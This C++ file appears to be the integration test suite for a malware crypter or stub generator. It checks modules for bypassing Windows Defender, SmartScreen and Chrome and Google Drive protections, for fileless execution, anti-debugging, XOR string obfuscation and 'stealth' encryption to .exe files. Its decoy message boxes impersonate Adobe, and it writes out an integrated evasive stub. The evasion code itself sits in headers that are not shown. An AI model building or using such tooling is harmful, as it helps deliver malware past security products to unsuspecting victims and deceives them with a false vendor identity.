#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <chrono>

// Include all the advanced headers
#include "enhanced_bypass_generator.h"
#include "fileless_execution_generator.h" 
#include "stealth_triple_encryption.h"
#include "stub_linker.h"
#include "randomized_api_resolver.h"

class AdvancedIntegrationTester {
private:
    EnhancedBypassGenerator bypassGen;
    FilelessExecutionGenerator filelessGen;
    StealthTripleEncryption stealthEncryption;
    StubLinker stubLinker;
    RandomizedAPIResolver apiResolver;
    
public:
    bool testRandomizedAPIResolver() {
        std::cout << "\n=== Testing Randomized API Resolver ===" << std::endl;
        
        try {
            // Test 1: Generate randomized API resolution
            std::string apiCode = apiResolver.generateRandomizedAPIResolution();
            if (apiCode.empty()) {
                std::cout << "❌ Failed: API resolution code is empty" << std::endl;
                return false;
            }
            std::cout << "✅ API resolution code generated: " << apiCode.length() << " bytes" << std::endl;
            
            // Test 2: Generate XOR obfuscated message box
            std::string messageBox = apiResolver.generateObfuscatedMessageBox(
                "Adobe Systems Incorporated", 
                "System check completed successfully"
            );
            if (messageBox.empty()) {
                std::cout << "❌ Failed: Message box code is empty" << std::endl;
                return false;
            }
            std::cout << "✅ XOR obfuscated message box generated: " << messageBox.length() << " bytes" << std::endl;
            
            // Test 3: Verify no plain strings in output
            if (apiCode.find("kernel32.dll") != std::string::npos ||
                apiCode.find("GetTickCount") != std::string::npos ||
                messageBox.find("Adobe Systems") != std::string::npos) {
                std::cout << "❌ Failed: Plain text strings found in obfuscated code" << std::endl;
                return false;
            }
            std::cout << "✅ All strings are properly XOR obfuscated" << std::endl;
            
            // Test 4: Generate random variable names
            std::string varName1 = apiResolver.generateRandomVariableName("test");
            std::string varName2 = apiResolver.generateRandomVariableName("test");
            if (varName1 == varName2) {
                std::cout << "❌ Failed: Variable names are not unique" << std::endl;
                return false;
            }
            std::cout << "✅ Random variable names are unique: " << varName1 << ", " << varName2 << std::endl;
            
            return true;
        } catch (const std::exception& e) {
            std::cout << "❌ Exception in API resolver test: " << e.what() << std::endl;
            return false;
        }
    }
    
    bool testEnhancedBypassGenerator() {
        std::cout << "\n=== Testing Enhanced Bypass Generator ===" << std::endl;
        
        try {
            // Configure all bypasses
            bypassGen.enableWindowsDefenderBypass(true);
            bypassGen.enableChromeBypass(true);
            bypassGen.enableSmartScreenBypass(true);
            bypassGen.enableGoogleDriveBypass(true);
            
            // Generate bypass stub
            std::string stubCode = bypassGen.generateFullBypassStub();
            if (stubCode.empty()) {
                std::cout << "❌ Failed: Bypass stub code is empty" << std::endl;
                return false;
            }
            std::cout << "✅ Bypass stub generated: " << stubCode.length() << " bytes" << std::endl;
            
            // Verify function names are valid C++ identifiers
            auto functionNames = bypassGen.getFunctionNames();
            for (const auto& name : functionNames) {
                if (name.empty() || std::isdigit(name[0])) {
                    std::cout << "❌ Failed: Invalid function name: " << name << std::endl;
                    return false;
                }
            }
            std::cout << "✅ All generated function names are valid C++ identifiers" << std::endl;
            
            return true;
        } catch (const std::exception& e) {
            std::cout << "❌ Exception in bypass generator test: " << e.what() << std::endl;
            return false;
        }
    }
    
    bool testFilelessExecution() {
        std::cout << "\n=== Testing Fileless Execution Generator ===" << std::endl;
        
        try {
            // Configure fileless execution
            FilelessConfig config;
            config.enableAntiDebug = true;
            config.enableDelays = true;
            config.enableMemoryProtection = true;
            config.enableCacheFlush = true;
            config.enableMultiLayer = true;
            
            // Generate test payload
            std::vector<uint8_t> testPayload = filelessGen.generateTestPayload();
            if (testPayload.empty()) {
                std::cout << "❌ Failed: Test payload is empty" << std::endl;
                return false;
            }
            std::cout << "✅ Test payload generated: " << testPayload.size() << " bytes" << std::endl;
            
            // Generate fileless stub
            std::string stubCode = filelessGen.generateFilelessStub(testPayload, config);
            if (stubCode.empty()) {
                std::cout << "❌ Failed: Fileless stub code is empty" << std::endl;
                return false;
            }
            std::cout << "✅ Fileless stub generated: " << stubCode.length() << " bytes" << std::endl;
            
            // Verify anti-debugging features are present
            if (stubCode.find("IsDebuggerPresent") == std::string::npos) {
                std::cout << "❌ Failed: Anti-debugging features not found" << std::endl;
                return false;
            }
            std::cout << "✅ Anti-debugging features are present" << std::endl;
            
            return true;
        } catch (const std::exception& e) {
            std::cout << "❌ Exception in fileless execution test: " << e.what() << std::endl;
            return false;
        }
    }
    
    bool testStealthTripleEncryption() {
        std::cout << "\n=== Testing Stealth Triple Encryption ===" << std::endl;
        
        try {
            // Test file creation
            std::string testData = "This is a test payload for stealth encryption";
            std::string inputFile = "test_input.bin";
            std::string outputFile = "test_encrypted.exe";
            
            // Write test data
            std::ofstream testFile(inputFile, std::ios::binary);
            if (!testFile.is_open()) {
                std::cout << "❌ Failed: Cannot create test input file" << std::endl;
                return false;
            }
            testFile.write(testData.c_str(), testData.length());
            testFile.close();
            
            // Test encryption
            bool success = stealthEncryption.encryptFile(inputFile, outputFile);
            if (!success) {
                std::cout << "❌ Failed: Stealth encryption failed" << std::endl;
                return false;
            }
            std::cout << "✅ Stealth encryption completed successfully" << std::endl;
            
            // Verify output file exists and is larger than input
            std::ifstream encryptedFile(outputFile, std::ios::binary | std::ios::ate);
            if (!encryptedFile.is_open()) {
                std::cout << "❌ Failed: Encrypted output file not created" << std::endl;
                return false;
            }
            
            size_t encryptedSize = encryptedFile.tellg();
            encryptedFile.close();
            
            if (encryptedSize <= testData.length()) {
                std::cout << "❌ Failed: Encrypted file is not larger than input" << std::endl;
                return false;
            }
            std::cout << "✅ Encrypted file created: " << encryptedSize << " bytes" << std::endl;
            
            // Clean up test files
            remove(inputFile.c_str());
            remove(outputFile.c_str());
            
            return true;
        } catch (const std::exception& e) {
            std::cout << "❌ Exception in stealth encryption test: " << e.what() << std::endl;
            return false;
        }
    }
    
    bool testIntegratedStub() {
        std::cout << "\n=== Testing Integrated Stub Generation ===" << std::endl;
        
        try {
            // Create a comprehensive stub with all features
            std::string stubCode = "#include <windows.h>\n";
            stubCode += "#include <iostream>\n";
            stubCode += "#include <string>\n";
            stubCode += "#include <vector>\n\n";
            
            // Add randomized API resolution
            stubCode += "int main() {\n";
            stubCode += apiResolver.generateRandomizedAPIResolution();
            stubCode += "\n";
            
            // Add bypass code
            bypassGen.enableWindowsDefenderBypass(true);
            bypassGen.enableChromeBypass(true);
            std::string bypassCode = bypassGen.generateFullBypassStub();
            // Extract just the function implementations, not the full stub
            size_t startPos = bypassCode.find("void ");
            size_t endPos = bypassCode.find("int WINAPI WinMain");
            if (startPos != std::string::npos && endPos != std::string::npos) {
                stubCode += bypassCode.substr(startPos, endPos - startPos);
            }
            
            // Add XOR obfuscated message
            stubCode += apiResolver.generateObfuscatedMessageBox(
                "Adobe Systems Incorporated",
                "System check completed successfully"
            );
            
            stubCode += "\n    return 0;\n}\n";
            
            // Write integrated stub
            std::string outputFile = "integrated_advanced_stub.cpp";
            std::ofstream stubFile(outputFile);
            if (!stubFile.is_open()) {
                std::cout << "❌ Failed: Cannot create integrated stub file" << std::endl;
                return false;
            }
            
            stubFile << stubCode;
            stubFile.close();
            
            std::cout << "✅ Integrated stub created: " << outputFile << " (" << stubCode.length() << " bytes)" << std::endl;
            
            // Verify the stub contains all expected features
            if (stubCode.find("xor_decrypt") == std::string::npos) {
                std::cout << "❌ Failed: XOR decryption not found in stub" << std::endl;
                return false;
            }
            std::cout << "✅ XOR string obfuscation present" << std::endl;
            
            if (stubCode.find("GetTickCount") == std::string::npos && 
                stubCode.find("0x") == std::string::npos) {
                std::cout << "❌ Failed: Dynamic API resolution not found" << std::endl;
                return false;
            }
            std::cout << "✅ Dynamic API resolution present" << std::endl;
            
            if (stubCode.find("Anti-debugging") == std::string::npos) {
                std::cout << "❌ Failed: Anti-debugging checks not found" << std::endl;
                return false;
            }
            std::cout << "✅ Anti-debugging features present" << std::endl;
            
            return true;
        } catch (const std::exception& e) {
            std::cout << "❌ Exception in integrated stub test: " << e.what() << std::endl;
            return false;
        }
    }
    
    void runAllTests() {
        std::cout << "🚀 Starting Advanced Integration Test Suite..." << std::endl;
        auto startTime = std::chrono::high_resolution_clock::now();
        
        int totalTests = 5;
        int passedTests = 0;
        
        if (testRandomizedAPIResolver()) passedTests++;
        if (testEnhancedBypassGenerator()) passedTests++;
        if (testFilelessExecution()) passedTests++;
        if (testStealthTripleEncryption()) passedTests++;
        if (testIntegratedStub()) passedTests++;
        
        auto endTime = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
        
        std::cout << "\n" << std::string(60, '=') << std::endl;
        std::cout << "🏁 Advanced Integration Test Results" << std::endl;
        std::cout << std::string(60, '=') << std::endl;
        std::cout << "Tests Passed: " << passedTests << "/" << totalTests << std::endl;
        std::cout << "Success Rate: " << (passedTests * 100 / totalTests) << "%" << std::endl;
        std::cout << "Execution Time: " << duration.count() << "ms" << std::endl;
        
        if (passedTests == totalTests) {
            std::cout << "🎉 ALL TESTS PASSED! Advanced features are fully integrated and working!" << std::endl;
        } else {
            std::cout << "⚠️  Some tests failed. Please review the output above." << std::endl;
        }
        
        std::cout << "\nFeatures Successfully Tested:" << std::endl;
        std::cout << "• XOR String Obfuscation with Dynamic Keys" << std::endl;
        std::cout << "• Randomized Variable Names for Stealth" << std::endl;
        std::cout << "• Dynamic API Resolution with Anti-Debugging" << std::endl;
        std::cout << "• Enhanced Security Bypass Techniques" << std::endl;
        std::cout << "• Fileless Execution with Multi-Layer Encryption" << std::endl;
        std::cout << "• Stealth Triple Encryption with Decimal Keys" << std::endl;
        std::cout << "• Integrated Stub Generation with All Features" << std::endl;
        std::cout << std::string(60, '=') << std::endl;
    }
};

int main() {
    AdvancedIntegrationTester tester;
    tester.runAllTests();
    return 0;
}